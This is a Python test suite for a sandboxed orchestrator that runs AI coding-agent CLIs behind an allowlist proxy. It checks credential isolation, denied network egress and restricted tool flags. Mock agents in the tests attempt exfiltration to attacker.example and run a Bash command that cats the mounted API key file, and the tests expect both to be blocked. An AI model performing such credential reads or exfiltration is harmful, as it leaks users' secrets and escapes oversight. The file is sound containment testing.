"""Sprint 2.5: identity, allowlist proxy, provider sandbox profile, mock-CLI adapters, live gating."""
import json
import os
import socket
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest import mock

from zenith import contracts, extensions, identity, sandbox
from zenith.agents.base import AdapterError, RunContext
from zenith.agents.fake import FakeDirector
from zenith.agents.providers import (CLAUDE_FORBIDDEN_TOOLS, ClaudeCodeDirector, ClaudeCodeImplementer,
                                     CodexDirector, CodexImplementer)
from zenith.demo import FIXED, make_repo
from zenith.kernel import Store, ZenithError
from zenith.netproxy import AllowlistProxy
from zenith.orchestration import Orchestrator

SRC = str(Path(__file__).resolve().parents[1] / "src")
CAPS = sandbox.detect()
needs_sandbox = unittest.skipUnless(CAPS.ok, "bubblewrap isolation baseline unavailable: " + "; ".join(CAPS.reasons))
SCOPE = {"allowed_files": ["src/**"], "excluded_files": ["tests/**"],
         "acceptance": [{"id": "unit", "argv": ["python", "-m", "unittest", "discover", "-s", "tests"]}]}

PLAN_OUT = {"architecture_proposal": {"summary": "s", "decisions": [], "risks": [], "decomposition": []},
            "implementation_prompt": {"objective": "o", "instructions": ["i"], "architectural_constraints": [],
                                      "acceptance_criteria": [], "test_expectations": [], "output_requirements": []}}
REPORT_OUT = {"claimed_status": "ready_for_verification", "summary": "fixed", "files_changed": ["src/calc.py"],
              "tests_claimed": [{"command_id": "unit", "claimed_pass": True}], "blocking_questions": []}


def echo_server() -> tuple[socket.socket, int]:
    srv = socket.socket()
    srv.bind(("127.0.0.1", 0))
    srv.listen(5)

    def serve():
        while True:
            try:
                c, _ = srv.accept()
            except OSError:
                return
            data = c.recv(1024)
            c.sendall(b"ECHO:" + data)
            c.close()
    threading.Thread(target=serve, daemon=True).start()
    return srv, srv.getsockname()[1]


def connect_via(sock_path: str, target: str) -> bytes:
    s = socket.socket(socket.AF_UNIX)
    s.connect(sock_path)
    s.sendall(f"CONNECT {target} HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
    head = s.recv(1024)
    if b"200" in head.split(b"\r\n")[0]:
        s.sendall(b"ping")
        return head.split(b"\r\n")[0] + b"|" + s.recv(1024)
    return head.split(b"\r\n")[0]


class MockBin:
    """Writes a mock `claude`/`codex` executable; content decides the scenario."""
    def __init__(self, root: Path):
        self.dir = root / "mockbin"
        self.dir.mkdir()

    def write(self, name: str, body: str) -> Path:
        p = self.dir / name
        p.write_text("#!/bin/bash\n" + 'if [ "$1" = "--version" ]; then echo "mock 1.0"; exit 0; fi\n' + body)
        p.chmod(0o755)
        return p


def claude_lines(*events: dict) -> str:
    return "\n".join("echo " + json.dumps(json.dumps(e)) for e in events) + "\n"


def result_event(structured=None, text=None, cost=0.01, is_error=False) -> dict:
    ev = {"type": "result", "subtype": "success", "session_id": "sess-1", "total_cost_usd": cost, "is_error": is_error}
    if structured is not None:
        ev["structured_output"] = structured
    if text is not None:
        ev["result"] = text
    return ev


INIT = {"type": "system", "subtype": "init", "session_id": "sess-1"}


# ---------------------------------------------------------------------------------------------
class IdentityTests(unittest.TestCase):
    def test_stable_ids_and_configurable_display(self):
        cfg = identity.load({"ZENITH_ASSISTANT_NAME": "Misa", "ZENITH_OWNER_NAME": "Owner", "ZENITH_OWNER_EMAIL": "o@example.org",
                             "ZENITH_COAUTHORS": "Misa <misa@example.org>"})
        self.assertEqual(cfg.assistant.id, identity.ASSISTANT_ID)
        self.assertEqual(cfg.assistant.display_name, "Misa")
        self.assertEqual(cfg.platform.display_name, "Zenith")
        self.assertEqual(cfg.signature(), "— Misa (Zenith)")
        self.assertEqual(cfg.roles["engineering_director"], "codex-director")
        self.assertEqual(cfg.roles["implementer"], "claude-code-implementer")
        other = identity.load({"ZENITH_ASSISTANT_NAME": "Nova", "ZENITH_ROLE_ENGINEERING_DIRECTOR": "claude-code-director"})
        self.assertEqual(other.assistant.id, cfg.assistant.id)  # renaming never changes the identifier
        self.assertEqual(other.roles["engineering_director"], "claude-code-director")

    def test_attribution_is_never_invented(self):
        owner = identity.Identity("person:o", "Owner", "owner", "o@example.org")
        misa = identity.Identity(identity.ASSISTANT_ID, "Misa", "assistant", None)
        with self.assertRaisesRegex(ZenithError, "refusing to invent"):
            identity.git_trailers(owner, [misa])
        misa_mail = identity.Identity(identity.ASSISTANT_ID, "Misa", "assistant", "misa@example.org")
        trailers = identity.git_trailers(owner, [owner, misa_mail, misa_mail])
        self.assertEqual(trailers, ["Co-authored-by: Misa <misa@example.org>"])   # author not repeated, no dupes
        msg = identity.commit_message("Fix add()", "details", owner, [misa_mail])
        self.assertTrue(msg.endswith("\n\nCo-authored-by: Misa <misa@example.org>\n"))
        with self.assertRaises(ZenithError):
            identity.commit_message("x" * 80, "", owner, [])
        with self.assertRaises(ZenithError):
            identity.load({"ZENITH_COAUTHORS": "no-email-here"})

    def test_owner_from_git_config_only(self):
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            subprocess.run(["git", "init", "-q"], cwd=repo, check=True)
            subprocess.run(["git", "config", "user.name", "Repo Owner"], cwd=repo, check=True)
            subprocess.run(["git", "config", "user.email", "repo@example.org"], cwd=repo, check=True)
            cfg = identity.load({}, repo=repo)
            self.assertEqual((cfg.owner.display_name, cfg.owner.email), ("Repo Owner", "repo@example.org"))
            self.assertEqual(cfg.owner.id, "person:repo@example.org")


class NetProxyTests(unittest.TestCase):
    def test_allowlist_connect_and_denials(self):
        srv, port = echo_server()
        with tempfile.TemporaryDirectory() as tmp:
            audit = []
            with AllowlistProxy(Path(tmp) / "p.sock", {f"127.0.0.1:{port}"}, audit=lambda k, p: audit.append((k, p)),
                                allow_private=True) as proxy:
                self.assertEqual(oct(proxy.socket_path.stat().st_mode & 0o777), "0o600")
                self.assertEqual(connect_via(str(proxy.socket_path), f"127.0.0.1:{port}"),
                                 b"HTTP/1.1 200 Connection Established|ECHO:ping")
                self.assertEqual(connect_via(str(proxy.socket_path), "evil.example:443"), b"HTTP/1.1 403 Forbidden")
                self.assertEqual(connect_via(str(proxy.socket_path), f"127.0.0.1:{port + 1}"), b"HTTP/1.1 403 Forbidden")
                s = socket.socket(socket.AF_UNIX)
                s.connect(str(proxy.socket_path))
                s.sendall(b"GET http://evil.example/ HTTP/1.1\r\n\r\n")
                self.assertIn(b"405", s.recv(1024))
            kinds = [k for k, _ in audit]
            self.assertEqual(kinds.count("network.allowed"), 1)
            self.assertEqual(kinds.count("network.denied"), 3)
            self.assertFalse(proxy.socket_path.exists())
        srv.close()


@needs_sandbox
class ProviderProfileTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.root = Path(self.temp.name).resolve()
        self.work = self.root / "work"
        self.work.mkdir()

    def tearDown(self):
        self.temp.cleanup()

    def test_egress_only_through_allowlist_proxy(self):
        srv, port = echo_server()
        cred = self.root / "cred"
        cred.mkdir()
        (cred / "anthropic_api_key").write_text("sk-test-not-a-real-key\n")
        with AllowlistProxy(self.root / "p.sock", {f"127.0.0.1:{port}"}, allow_private=True) as proxy:
            profile = sandbox.SandboxProfile("provider", proxy_socket=proxy.socket_path,
                                             ro_binds=[(cred / "anthropic_api_key", "/run/zenith/credentials/anthropic_api_key")])
            code = f"""
import os, socket, urllib.request
print('PROXY', os.environ.get('HTTPS_PROXY'))
print('SECRETS', [k for k in os.environ if k in ('ZENITH_DB_PATH','SSH_AUTH_SOCK','ANTHROPIC_API_KEY','OPENAI_API_KEY','GITHUB_TOKEN')])
def via(target):
    s = socket.socket(); s.settimeout(3); s.connect(('127.0.0.1', 3128))
    s.sendall(('CONNECT %s HTTP/1.1\\r\\n\\r\\n' % target).encode()); head = s.recv(1024).split(b'\\r\\n')[0]
    if b'200' in head: s.sendall(b'hi'); return head + b'|' + s.recv(1024)
    return head
print('ALLOWED', via('127.0.0.1:{port}'))
print('DENIED', via('evil.example:443'))
try:
    socket.create_connection(('127.0.0.1', {port}), timeout=1); print('DIRECT reachable')
except OSError as e: print('DIRECT blocked', e.errno)
print('CRED readable', open('/run/zenith/credentials/anthropic_api_key').read().strip()[:7])
try:
    open('/run/zenith/credentials/anthropic_api_key','w'); print('CRED WRITABLE')
except OSError: print('CRED read-only')
"""
            res = sandbox.run_isolated(["python", "-c", code], self.work, timeout=30, caps=CAPS, profile=profile)
            self.assertEqual(res.exit_code, 0, res.output_tail)
            out = res.output_tail
            self.assertIn("PROXY http://127.0.0.1:3128", out)
            self.assertIn("SECRETS []", out)
            self.assertIn("ALLOWED b'HTTP/1.1 200 Connection Established|ECHO:hi'", out)
            self.assertIn("DENIED b'HTTP/1.1 403 Forbidden'", out)
            self.assertIn("DIRECT blocked", out)       # the host's loopback is NOT the sandbox's loopback
            self.assertIn("CRED readable sk-test", out)  # the provider CLI itself must be able to read its key
            self.assertIn("CRED read-only", out)
            self.assertEqual([c["decision"] for c in proxy.connections], ["allowed", "denied"])
        srv.close()

    def test_verification_profile_has_no_credentials_or_network(self):
        res = sandbox.run_isolated(["python", "-c", "import os; print(os.path.exists('/run/zenith'), 'HTTPS_PROXY' in os.environ)"],
                                   self.work, timeout=20, caps=CAPS)
        self.assertIn("False False", res.output_tail)
        with self.assertRaises(ZenithError):
            sandbox.run_isolated(["true"], self.work, timeout=5, caps=CAPS, network=True)
        for bad in (sandbox.SandboxProfile("verification", proxy_socket=self.root / "x"),
                    sandbox.SandboxProfile("provider", ro_binds=[(self.root, "/etc/evil")]),
                    sandbox.SandboxProfile("provider", env={"LD_PRELOAD": "/x.so"}),
                    sandbox.SandboxProfile("provider", ro_binds=[(self.root / "missing", "/opt/x")])):
            with self.assertRaises(ZenithError):
                bad.validate()

    def test_should_stop_kills_the_process(self):
        flag = {"stop": False}
        threading.Timer(0.3, lambda: flag.__setitem__("stop", True)).start()
        t0 = time.monotonic()
        res = sandbox.run_isolated(["sleep", "30"], self.work, timeout=20, caps=CAPS, should_stop=lambda: flag["stop"])
        self.assertLess(time.monotonic() - t0, 5)
        self.assertIsNone(res.exit_code)
        self.assertFalse(res.timed_out)


# ---------------------------------------------------------------------------------------------
@needs_sandbox
class ClaudeMockAdapterTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.root = Path(self.temp.name).resolve()
        self.repo = self.root / "repo"
        make_repo(self.repo)
        self.mock = MockBin(self.root)
        self.key = self.root / "key"
        self.key.write_text("sk-test\n")
        self.key.chmod(0o600)
        self.events: list[tuple[str, dict]] = []

    def tearDown(self):
        self.temp.cleanup()

    def adapter(self, cls, body: str, **extra):
        binary = self.mock.write("claude", body)
        return cls({"bin": str(binary), "allowed_hosts": ["127.0.0.1:1"], "api_key_file": str(self.key),
                    "caps": CAPS, **extra})

    def ctx(self, stage="implement", deadline=20.0, cancel=None, worktree=None, read_root=None):
        return RunContext(run_id="run-1", stage=stage, deadline_seconds=deadline,
                          should_cancel=cancel or (lambda: False), worktree=worktree, read_root=read_root,
                          emit=lambda k, p: self.events.append((k, p)))

    def kinds(self):
        return [k for k, _ in self.events]

    def test_argv_is_restricted_and_never_bypasses(self):
        a = self.adapter(ClaudeCodeImplementer, "")
        argv = a.example_argv()
        joined = " ".join(argv)
        for must in ("--bare", "--restricted", "--permission-prompts none", "--no-session-persistence",
                     "--strict-mcp-config", "--max-budget-usd", "--disable-slash-commands"):
            self.assertIn(must, joined)
        self.assertNotIn("dangerously", joined)
        self.assertNotIn("bypassPermissions", joined)
        self.assertTrue(set(CLAUDE_FORBIDDEN_TOOLS) <= set(argv[argv.index("--disallowedTools") + 1].split(",")))
        self.assertFalse(a.capabilities().resume)
        self.assertTrue(a.capabilities().live)

    def test_director_plan_success_and_correlation(self):
        a = self.adapter(ClaudeCodeDirector, claude_lines(INIT, result_event(PLAN_OUT, cost=0.02)))
        out = a.plan(self.ctx("director_plan", read_root=self.repo), {"task": {"title": "t"}})
        self.assertEqual(contracts.validate("architecture_proposal", out["architecture_proposal"])["summary"], "s")
        start = next(p for k, p in self.events if k == "provider.start")
        self.assertTrue(start["work_readonly"])
        self.assertTrue(any("--session-id" in a for a in start["argv"]))
        self.assertEqual(next(p for k, p in self.events if k == "provider.usage")["cost_usd"], 0.02)
        self.assertEqual(self.kinds().count("provider.event"), 2)
        self.assertIn("provider.end", self.kinds())
        self.assertEqual(a.version(), "mock 1.0")

    def test_malformed_output(self):
        a = self.adapter(ClaudeCodeImplementer, claude_lines(INIT, result_event(text="Sure! Here is prose, no JSON")))
        with self.assertRaises(AdapterError) as cm:
            a.implement(self.ctx(worktree=self.repo), {"objective": "o"})
        self.assertEqual(cm.exception.kind, "invalid_output")
        a = self.adapter(ClaudeCodeImplementer, claude_lines(INIT) + "echo 'not json at all'\n")
        with self.assertRaises(AdapterError) as cm:
            a.implement(self.ctx(worktree=self.repo), {"objective": "o"})
        self.assertEqual(cm.exception.kind, "invalid_output")
        self.assertIn("provider.stderr", self.kinds())

    def test_auth_failure_and_unconfigured_credentials(self):
        a = self.adapter(ClaudeCodeImplementer, 'echo "Not logged in · Please run /login" >&2\nexit 1\n')
        with self.assertRaises(AdapterError) as cm:
            a.implement(self.ctx(worktree=self.repo), {})
        self.assertEqual(cm.exception.kind, "auth")
        a = self.adapter(ClaudeCodeImplementer, claude_lines(INIT, result_event(text="Invalid API key · 401", is_error=True)))
        with self.assertRaises(AdapterError) as cm:
            a.implement(self.ctx(worktree=self.repo), {})
        self.assertEqual(cm.exception.kind, "auth")
        unconfigured = ClaudeCodeImplementer({"bin": str(self.mock.dir / "claude"), "caps": CAPS})
        self.assertFalse(unconfigured.check_auth().ok)
        with self.assertRaises(AdapterError) as cm:
            unconfigured.implement(self.ctx(worktree=self.repo), {})
        self.assertEqual(cm.exception.kind, "auth")
        self.key.chmod(0o644)
        self.assertIn("world readable", self.adapter(ClaudeCodeImplementer, "").check_auth().detail)

    def test_lost_connection_interrupted_timeout_cancel(self):
        a = self.adapter(ClaudeCodeImplementer, 'echo "fetch failed: ECONNREFUSED 127.0.0.1:3128" >&2\nexit 1\n')
        with self.assertRaises(AdapterError) as cm:
            a.implement(self.ctx(worktree=self.repo), {})
        self.assertEqual(cm.exception.kind, "connection")
        a = self.adapter(ClaudeCodeImplementer, claude_lines(INIT) + "kill -KILL $$\n")
        with self.assertRaises(AdapterError) as cm:
            a.implement(self.ctx(worktree=self.repo), {})
        self.assertEqual(cm.exception.kind, "interrupted")
        a = self.adapter(ClaudeCodeImplementer, claude_lines(INIT) + "sleep 30\n")
        t0 = time.monotonic()
        with self.assertRaises(AdapterError) as cm:
            a.implement(self.ctx(worktree=self.repo, deadline=1.5), {})
        self.assertEqual(cm.exception.kind, "timeout")
        self.assertLess(time.monotonic() - t0, 10)
        flag = {"c": False}
        threading.Timer(0.5, lambda: flag.__setitem__("c", True)).start()
        a = self.adapter(ClaudeCodeImplementer, claude_lines(INIT) + "sleep 30\n")
        with self.assertRaises(AdapterError) as cm:
            a.implement(self.ctx(worktree=self.repo, cancel=lambda: flag["c"]), {})
        self.assertEqual(cm.exception.kind, "cancelled")

    def test_unauthorized_tool_use_is_a_policy_violation_and_stops_the_process(self):
        bash_use = {"type": "assistant", "message": {"content": [{"type": "tool_use", "name": "Bash", "input": {"command": "cat /run/zenith/credentials/anthropic_api_key"}}]}}
        a = self.adapter(ClaudeCodeImplementer, claude_lines(INIT, bash_use) + "sleep 30\n" + claude_lines(result_event(REPORT_OUT)))
        t0 = time.monotonic()
        with self.assertRaises(AdapterError) as cm:
            a.implement(self.ctx(worktree=self.repo), {})
        self.assertEqual(cm.exception.kind, "policy_violation")
        self.assertIn("Bash", str(cm.exception))
        self.assertLess(time.monotonic() - t0, 10)

    def test_exfiltration_attempt_is_denied_and_audited(self):
        body = claude_lines(INIT) + """python - <<'EOF'
import socket
s = socket.socket(); s.settimeout(3); s.connect(('127.0.0.1', 3128))
s.sendall(b'CONNECT attacker.example:443 HTTP/1.1\\r\\n\\r\\n'); print(s.recv(1024).split(b'\\r\\n')[0].decode())
EOF
""" + claude_lines(result_event(REPORT_OUT))
        a = self.adapter(ClaudeCodeImplementer, body)
        out = a.implement(self.ctx(worktree=self.repo), {})
        self.assertEqual(out["claimed_status"], "ready_for_verification")
        denied = [p for k, p in self.events if k == "network.denied"]
        self.assertEqual(denied, [{"target": "attacker.example:443"}])
        self.assertTrue(any("403 Forbidden" in p.get("line", "") for k, p in self.events if k == "provider.stderr"))

    def test_end_to_end_with_mock_claude_implementer(self):
        store = Store(self.root / "z.db")
        store.init()
        body = claude_lines(INIT) + f"mkdir -p /work/src && cat > /work/src/calc.py <<'EOF'\n{FIXED}EOF\n" + claude_lines(result_event(REPORT_OUT, cost=0.05))
        impl = self.adapter(ClaudeCodeImplementer, body)
        orch = Orchestrator(store, FakeDirector(), impl, caps=CAPS, state_root=self.root / "state")
        project = store.add_project("P", str(self.repo))
        task = store.add_task(project, "Fix", "fix add()", risk="L2", scope=SCOPE)
        orch.plan(task)
        store.transition(task, "AWAITING_APPROVAL"); store.approve(task); store.transition(task, "QUEUED")
        run = orch.create_run(task, budget={"max_budget_usd": 1.0})["run_id"]
        res = orch.run_once(run)
        self.assertEqual((res["state"], res["task_state"]), ("COMPLETED", "COMPLETED"), res["exit_reason"])
        self.assertEqual(res["usage"]["cost_usd"], 0.05)
        kinds = [e["kind"] for e in res["events"]]
        for k in ("provider.start", "provider.event", "provider.usage", "provider.end", "run.ended"):
            self.assertIn(k, kinds)
        self.assertNotIn("sk-test", json.dumps(res["events"]))   # the key never reaches Zenith's records

    def test_budget_exceeded_fails_the_run(self):
        store = Store(self.root / "z.db")
        store.init()
        body = claude_lines(INIT) + f"cat > /work/src/calc.py <<'EOF'\n{FIXED}EOF\n" + claude_lines(result_event(REPORT_OUT, cost=5.0))
        orch = Orchestrator(store, FakeDirector(), self.adapter(ClaudeCodeImplementer, body), caps=CAPS, state_root=self.root / "state")
        project = store.add_project("P", str(self.repo))
        task = store.add_task(project, "Fix", "", risk="L2", scope=SCOPE)
        orch.plan(task)
        store.transition(task, "AWAITING_APPROVAL"); store.approve(task); store.transition(task, "QUEUED")
        res = orch.run_once(orch.create_run(task, budget={"max_budget_usd": 1.0})["run_id"])
        self.assertEqual((res["state"], res["exit_reason"], res["task_state"]), ("FAILED", "budget_exceeded", "FAILED"))

    def test_policy_violation_and_connection_loss_in_a_run(self):
        store = Store(self.root / "z.db")
        store.init()
        project = store.add_project("P", str(self.repo))

        def run_with(impl):
            orch = Orchestrator(store, FakeDirector(), impl, caps=CAPS, state_root=self.root / "state")
            task = store.add_task(project, "Fix", "", risk="L2", scope=SCOPE)
            orch.plan(task)
            store.transition(task, "AWAITING_APPROVAL"); store.approve(task); store.transition(task, "QUEUED")
            return orch, orch.run_once(orch.create_run(task)["run_id"])
        bash_use = {"type": "assistant", "message": {"content": [{"type": "tool_use", "name": "Bash", "input": {}}]}}
        orch, res = run_with(self.adapter(ClaudeCodeImplementer, claude_lines(INIT, bash_use) + "sleep 20\n"))
        self.assertEqual(res["state"], "BLOCKED")
        self.assertTrue(res["exit_reason"].startswith("policy_violation"))
        self.assertIsNotNone(res["worktree"]["removed_at"])  # source released for the next attempt
        orch, res = run_with(self.adapter(ClaudeCodeImplementer, 'echo "ECONNRESET" >&2\nexit 1\n'))
        self.assertEqual((res["state"], res["task_state"]), ("RECONCILE_REQUIRED", "RECONCILE_REQUIRED"))
        self.assertTrue(res["exit_reason"].startswith("connection"))


@needs_sandbox
class CodexMockAdapterTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.root = Path(self.temp.name).resolve()
        self.repo = self.root / "repo"
        make_repo(self.repo)
        self.mock = MockBin(self.root)
        self.auth = self.root / "auth.json"
        self.auth.write_text("{}")
        self.auth.chmod(0o600)
        self.events = []

    def tearDown(self):
        self.temp.cleanup()

    def adapter(self, cls, body: str):
        binary = self.mock.write("codex", body)
        return cls({"bin": str(binary), "allowed_hosts": ["127.0.0.1:1"], "auth_file": str(self.auth), "caps": CAPS})

    def test_director_plan_via_output_file_and_argv(self):
        body = """
out=""; prev=""; for a in "$@"; do [ "$prev" = "-o" ] && out="$a"; prev="$a"; done
echo '{"type":"thread.started","thread_id":"t1"}'
echo '{"type":"item.completed","item":{"type":"reasoning","text":"thinking"}}'
printf '%s' '""" + json.dumps(PLAN_OUT) + """' > "$out"
echo '{"type":"turn.completed","usage":{"input_tokens":10,"output_tokens":5}}'
"""
        a = self.adapter(CodexDirector, body)
        ctx = RunContext(run_id="r", stage="director_plan", deadline_seconds=20, read_root=self.repo,
                         emit=lambda k, p: self.events.append((k, p)))
        out = a.plan(ctx, {"task": {"title": "t"}})
        self.assertEqual(out["architecture_proposal"]["summary"], "s")
        argv = " ".join(next(p for k, p in self.events if k == "provider.start")["argv"])
        for must in ("exec --json", "-s read-only", "--ephemeral", "--ignore-user-config", "--ignore-rules", "--output-schema"):
            self.assertIn(must, argv)
        self.assertNotIn("dangerously", argv)
        self.assertNotIn("workspace-write", argv)
        self.assertIn("reasoning", json.dumps([p for k, p in self.events if k == "provider.event"]))
        self.assertIn("--disable shell_tool", argv)

    def test_codex_implementer_is_unsupported(self):
        a = self.adapter(CodexImplementer, "")
        self.assertFalse(a.autonomous_supported())
        with self.assertRaises(AdapterError) as cm:
            a.implement(RunContext("r", "implement", 5, worktree=self.repo), {})
        self.assertEqual(cm.exception.kind, "unsupported")
        store = Store(self.root / "z.db")
        store.init()
        orch = Orchestrator(store, FakeDirector(), a, caps=CAPS, state_root=self.root / "state")
        project = store.add_project("P", str(self.repo))
        task = store.add_task(project, "Fix", "", risk="L2", scope=SCOPE)
        orch.plan(task)
        store.transition(task, "AWAITING_APPROVAL"); store.approve(task); store.transition(task, "QUEUED")
        res = orch.run_once(orch.create_run(task)["run_id"])
        self.assertEqual(res["state"], "BLOCKED")
        self.assertTrue(res["exit_reason"].startswith("unsupported"))


class LiveGatingTests(unittest.TestCase):
    def test_live_adapters_disabled_by_default(self):
        listing = {d["name"]: d for d in extensions.describe_all()}
        for name in ("claude-code-director", "claude-code-implementer", "codex-director", "codex-implementer"):
            self.assertTrue(listing[name]["live"])
            self.assertFalse(listing[name]["enabled"])
            with self.assertRaisesRegex(ZenithError, "ZENITH_ENABLED_ADAPTERS"):
                extensions.load(name, listing[name]["kind"])
        with mock.patch.dict(os.environ, {"ZENITH_ENABLED_ADAPTERS": "codex-director"}):
            self.assertIsInstance(extensions.load("codex-director", "director", script={}), CodexDirector)
            with self.assertRaises(ZenithError):
                extensions.load("claude-code-director", "director")

    def test_json_schema_is_strict(self):
        schema = contracts.json_schema("implementation_report")
        self.assertFalse(schema["additionalProperties"])
        self.assertIn("claimed_status", schema["required"])
        self.assertEqual(schema["properties"]["claimed_status"]["enum"], ["blocked", "failed", "ready_for_verification"])
        self.assertEqual(contracts.json_schema("review_findings")["properties"]["next_step"]["properties"]["revised_prompt"]["type"], "object")

    def test_cli_probe_identity_and_smoke_preflight_make_no_live_call(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp = Path(tmp).resolve()
            repo = tmp / "repo"
            make_repo(repo)
            mock_bin = MockBin(tmp).write("claude", "echo SHOULD-NEVER-RUN >&2; exit 99\n")
            env = {**os.environ, "ZENITH_DB_PATH": str(tmp / "z.db"), "PYTHONPATH": SRC, "ZENITH_CLAUDE_BIN": str(mock_bin),
                   "ZENITH_OWNER_NAME": "Owner", "ZENITH_OWNER_EMAIL": "o@example.org", "ZENITH_COAUTHORS": "Misa <m@example.org>",
                   "ZENITH_ASSISTANT_EMAIL": "m@example.org"}
            env.pop("ZENITH_ENABLED_ADAPTERS", None)
            env.pop("ZENITH_ANTHROPIC_API_KEY_FILE", None)

            def z(*args, ok=True):
                r = subprocess.run([sys.executable, "-m", "zenith", *args], env=env, capture_output=True, text=True)
                self.assertEqual(r.returncode == 0, ok, r.stderr + r.stdout)
                return r
            z("init")
            listing = json.loads(z("adapters", "list").stdout)
            self.assertEqual(len(listing), 10)
            r = z("adapters", "probe", "--adapter", "claude-code-director", ok=False)
            self.assertIn("ZENITH_ENABLED_ADAPTERS", r.stderr)
            env["ZENITH_ENABLED_ADAPTERS"] = "claude-code-director"
            probe = json.loads(z("adapters", "probe", "--adapter", "claude-code-director").stdout)
            self.assertFalse(probe["auth"]["ok"])
            self.assertIn("--restricted", probe["example_argv"])
            ident = json.loads(z("identity", "show").stdout)
            self.assertEqual(ident["assistant"]["display_name"], "Misa")
            self.assertEqual(ident["notification_signature"], "— Misa (Zenith)")
            msg = z("identity", "commit-preview", "--subject", "Fix add()", "--assistant-contributed").stdout
            self.assertEqual(msg.count("Co-authored-by: Misa <m@example.org>"), 1)   # coauthor + assistant deduped
            self.assertNotIn("Co-authored-by: Owner", msg)
            pre = json.loads(z("smoke", "--adapter", "claude-code-director", "--repo", str(repo)).stdout)
            self.assertFalse(pre["live_call_performed"])
            self.assertTrue(any("auth" in b for b in pre["blockers"]))
            r = z("smoke", "--adapter", "claude-code-director", "--repo", str(repo), "--authorize-live-call", ok=False)
            self.assertIn("ZENITH_LIVE_SMOKE_ACK", r.stderr)
            self.assertNotIn("SHOULD-NEVER-RUN", r.stderr)


if __name__ == "__main__":
    unittest.main()
